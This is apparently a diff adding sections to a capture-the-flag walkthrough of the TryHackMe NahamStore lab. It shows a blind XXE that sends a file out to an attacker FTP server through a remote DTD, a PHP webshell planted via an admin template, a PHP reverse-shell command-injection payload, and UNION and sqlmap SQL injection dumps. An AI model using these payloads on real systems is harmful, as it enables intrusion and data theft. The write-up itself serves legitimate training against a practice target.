@@ -555,7 +555,7 @@ We can read the /etc/passwd file with this payload:
 
 <figure><img src=".gitbook/assets/image (513).png" alt=""><figcaption></figcaption></figure>
 
-Readin the 1st flag with:
+Reading the 1st flag with:
 
 ```xml
 <?xml version="1.0"?>
@@ -567,33 +567,328 @@ Readin the 1st flag with:
 	</data>
 ```
 
+### Blind XXE / OOB XXE
 
+There is a page that let us upload xlsx files: [http://nahamstore.thm/staff](http://nahamstore.thm/staff)
 
+But what is an XLSX? Just a zip with XML files inside. So if value are extracted from it there is a chance for XXE.
 
+We can consult PayloadsAllTheThings for [OOB](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XXE%20Injection/README.md#exploiting-blind-xxe-to-exfiltrate-data-out-of-band) & [XLSX](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XXE%20Injection/README.md#xxe-inside-xlsx-file) payloads (OOB because the values are not reflected).
 
+First I created a spreadsheet file with LibreOffice Calc (`xxe.xlsx`).
 
+Let's extract the ZIP:
 
+```bash
+# extract the xxe.xlsx file into a dir XXE.
+7z x -oXXE xxe.xlsx
+```
 
+<figure><img src=".gitbook/assets/image (533).png" alt=""><figcaption></figcaption></figure>
 
+I added the OOB XXE payload inside `xl/workbook.xml`.
 
+{% code title="workbook.xml" %}
+```xml
+<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<!DOCTYPE cdl [<!ELEMENT cdl ANY ><!ENTITY % asd SYSTEM "http://10.18.88.214:8000/xxe.dtd">%asd;%c;]>
+<cdl>&rrr;</cdl>
+<workbook xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" xmlns:r="http://schemas.openxmlforma>
 
+```
+{% endcode %}
 
+Let's rebuild the spreadsheet:
 
+```bash
+# updates the xxe.xlsx file.
+7z u ../xxe.xlsx *
+```
 
+Using a remote DTD will save us the time to rebuild a document each time we want to retrieve a different file. Instead we build the document once and then change the DTD. And using FTP instead of HTTP allows to retrieve much larger files.
 
+{% code title="xxe.dtd" overflow="wrap" %}
+```xml
+<!ENTITY % d SYSTEM "php://filter/convert.base64-encode/resource=/flag.txt">
+<!ENTITY % c "<!ENTITY rrr SYSTEM 'ftp://10.9.19.77:2121/%d;'>"> 
+```
+{% endcode %}
 
+<figure><img src=".gitbook/assets/image (534).png" alt=""><figcaption></figcaption></figure>
 
+All the files are set.
 
+Start the FTP + HTTP server:
 
+```bash
+python3 -m http.server 8000
+```
 
+Download [xxeftp](https://github.com/staaldraad/xxeserv) you have to compile it with `GO` --> "go build xxeftp.go"
 
+```bash
+xxeftp  -o files.log -p 2121 -w -wd public -wp 8000
+```
 
+Upload the `xxe.xlsx` file.
 
+<figure><img src=".gitbook/assets/image (535).png" alt=""><figcaption></figcaption></figure>
 
+Immediately our FTP and HTTP server should receive the `/flag.txt` file.
 
+<figure><img src=".gitbook/assets/image (536).png" alt=""><figcaption></figcaption></figure>
 
+{% code overflow="wrap" %}
+```bash
+dking@dking ~/Downloads$ cat files.log                                                                          
+USER:  anonymous
+PASS:  anonymous
+//e2Q2YjIyY2IzZTM3YmVmMzJkODAwMTA1YjExMTA3ZDhmfQo=
+SIZE
+MDTM
+USER:  anonymous
+PASS:  anonymous
+SIZE
+PASV
+```
+{% endcode %}
 
+Decode the base64 --> `e2Q2YjIyY2IzZTM3YmVmMzJkODAwMTA1YjExMTA3ZDhmfQo=`&#x20;
 
+Outpur --> {d6b22cb3e37bef32d800105b11107d8f}
 
+## RCE
 
+### 1st RCE Flag / PHP webshell
+
+Enumerating port 8000.
+
+{% code overflow="wrap" %}
+```
+gobuster dir -u http://nahamstore.thm:8000 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -b 404,403 --no-error -t 200
+
+admin
+```
+{% endcode %}
+
+<figure><img src=".gitbook/assets/image (537).png" alt=""><figcaption></figcaption></figure>
+
+[http://nahamstore.thm:8000/admin/login](http://nahamstore.thm:8000/admin/login)
+
+We can login with `admin : admin`&#x20;
+
+<figure><img src=".gitbook/assets/image (538).png" alt=""><figcaption></figcaption></figure>
+
+This is  the same dashboard at [http://marketing.nahamstore.thm/](http://marketing.nahamstore.thm/)
+
+Here the admin panel allows us to modify the templates of the page displayed at [http://marketing.nahamstore.thm/](http://marketing.nahamstore.thm/)
+
+I replaced the description paragraph with a simple webshell:
+
+```php
+<?php
+
+if(isset($_REQUEST['cmd'])){
+        echo "<pre>";
+        $cmd = ($_REQUEST['cmd']);
+        system($cmd);
+        echo "</pre>";
+        die;
+}
+
+?>
+```
+
+Then it's easy to execute a command:&#x20;
+
+[http://marketing.nahamstore.thm/8d1952ba2b3c6dcd76236f090ab8642c/?cmd=id](http://marketing.nahamstore.thm/8d1952ba2b3c6dcd76236f090ab8642c/?cmd=id)
+
+<figure><img src=".gitbook/assets/image (539).png" alt=""><figcaption></figcaption></figure>
+
+<figure><img src=".gitbook/assets/image (540).png" alt=""><figcaption></figcaption></figure>
+
+### 2nd Flag / Blind RCE
+
+We already found an IDOR in the `user_id` param of the PDF generator function (PDF Receipt) but there is also a RCE in the `id` one.
+
+_In the **id** parameter we will use this payload :_&#x20;
+
+{% code overflow="wrap" %}
+```bash
+$(php -r '$sock=fsockopen("10.18.88.214",9000);exec("/bin/sh -i <&3 >&3 2>&3");')
+```
+{% endcode %}
+
+_We will encode it to the URL_
+
+<figure><img src=".gitbook/assets/image (543).png" alt=""><figcaption></figcaption></figure>
+
+_Our payload request will be:_
+
+{% code overflow="wrap" %}
+```
+what=order&id=4%24%28%70%68%70%20%2d%72%20%27%24%73%6f%63%6b%3d%66%73%6f%63%6b%6f%70%65%6e%28%22%31%30%2e%31%38%2e%38%38%2e%32%31%34%22%2c%39%30%30%30%29%3b%65%78%65%63%28%22%2f%62%69%6e%2f%73%68%20%2d%69%20%3c%26%33%20%3e%26%33%20%32%3e%26%33%22%29%3b%27%29
+```
+{% endcode %}
+
+Setup nc listener, use burpsuite intercept to intercept the traffic then modify the value of `id` and we get shell.
+
+<figure><img src=".gitbook/assets/image (544).png" alt=""><figcaption></figcaption></figure>
+
+From here we can read `/etc/hosts` and find some useful domains for the recon section.
+
+{% code title="/etc/hosts" %}
+```
+127.0.0.1       localhost
+::1     localhost ip6-localhost ip6-loopback
+fe00::0 ip6-localnet
+ff00::0 ip6-mcastprefix
+ff02::1 ip6-allnodes
+ff02::2 ip6-allrouters
+172.17.0.4      2431fe29a4b0
+127.0.0.1       nahamstore.thm
+127.0.0.1       www.nahamstore.thm
+172.17.0.1      stock.nahamstore.thm
+172.17.0.1      marketing.nahamstore.thm
+172.17.0.1      shop.nahamstore.thm
+172.17.0.1      nahamstore-2020.nahamstore.thm
+172.17.0.1      nahamstore-2020-dev.nahamstore.thm
+10.131.104.72   internal-api.nahamstore.thm
+```
+{% endcode %}
+
+## SQLI
+
+### In-band
+
+By entering an invalid ID for the product, I got an error message for MySQL out of it.
+
+[http://nahamstore.thm/product?id=1'](http://nahamstore.thm/product?id=1%27)
+
+<figure><img src=".gitbook/assets/image (545).png" alt=""><figcaption></figcaption></figure>
+
+#### No of Columns
+
+Playing around i see there are 5 columns there.
+
+```sql
+1099 UNION SELECT NULL,NULL,NULL,NULL,NULL-- -
+```
+
+#### DB Version
+
+```sql
+1099 UNION SELECT NULL,@@version,NULL,NULL,NULL-- -
+```
+
+<figure><img src=".gitbook/assets/image (547).png" alt=""><figcaption></figcaption></figure>
+
+#### DBs / Schemas
+
+{% code overflow="wrap" %}
+```sql
+1099 UNION SELECT NULL,GROUP_CONCAT(SCHEMA_NAME),NULL,NULL,NULL FROM information_schema.SCHEMATA-- -
+
+# information_schema,nahamstore
+```
+{% endcode %}
+
+#### Tables
+
+{% code overflow="wrap" %}
+```sql
+1099 UNION SELECT NULL,GROUP_CONCAT(table_name),NULL,NULL,NULL FROM information_schema.tables WHERE table_schema="nahamstore"-- -
+
+# product,sqli_one
+```
+{% endcode %}
+
+#### Columns
+
+{% code overflow="wrap" %}
+```sql
+# columns for "sqli_one" table.
+1099 UNION SELECT NULL,GROUP_CONCAT(column_name),NULL,NULL,NULL FROM information_schema.columns WHERE table_name="sqli_one"-- -
+
+# flag,id
+```
+{% endcode %}
+
+#### Dump Data
+
+{% code overflow="wrap" %}
+```sql
+1099 UNION SELECT NULL,GROUP_CONCAT(flag,id),NULL,NULL,NULL FROM nahamstore.sqli_one-- -
+
+{d890234e20be48ff96a2f9caab0de55c}1
+```
+{% endcode %}
+
+### Inferential SQLi <a href="#inferential-sqli" id="inferential-sqli"></a>
+
+The second one is pretty hard to identify. It happens in the `/return` request:
+
+The easiest way to exploit it will be to save the request to a file and pass it to sqlmap.
+
+<figure><img src=".gitbook/assets/image (548).png" alt=""><figcaption></figcaption></figure>
+
+{% code title="req.txt" %}
+```
+POST /returns HTTP/1.1
+Host: nahamstore.thm
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: multipart/form-data; boundary=---------------------------86688607116737285133964723420
+Content-Length: 419
+Origin: http://nahamstore.thm
+Connection: close
+Referer: http://nahamstore.thm/returns
+Cookie: token=da26c04730a46d6acdae6f7236802d6e; session=981b443ffdb368f8f31f9c4591fd020c
+Upgrade-Insecure-Requests: 1
+
+-----------------------------86688607116737285133964723420
+Content-Disposition: form-data; name="order_number"
+
+1
+-----------------------------86688607116737285133964723420
+Content-Disposition: form-data; name="return_reason"
+
+2
+-----------------------------86688607116737285133964723420
+Content-Disposition: form-data; name="return_info"
+
+Hell
+-----------------------------86688607116737285133964723420--
+
+```
+{% endcode %}
+
+{% code overflow="wrap" %}
+```bash
+dking@dking ~/Downloads$ sqlmap -r req.txt --batch --level 5 --risk 3 --dbs                                    
+# available databases [2]:
+[*] information_schema
+[*] nahamstore
+```
+{% endcode %}
+
+{% code overflow="wrap" lineNumbers="true" %}
+```bash
+sqlmap -r req.txt --batch --level 5 --risk 3 -D nahamstore --dump --threads 10 
+
+# Database: nahamstore
+Table: sqli_two
+[1 entry]
++----+------------------------------------+
+| id | flag                               |
++----+------------------------------------+
+| 1  | {212ec3b036925a38b7167cf9f0243015} |
+```
+{% endcode %}
+
+Done!
+
+Learned a lot from this room 🤗
 
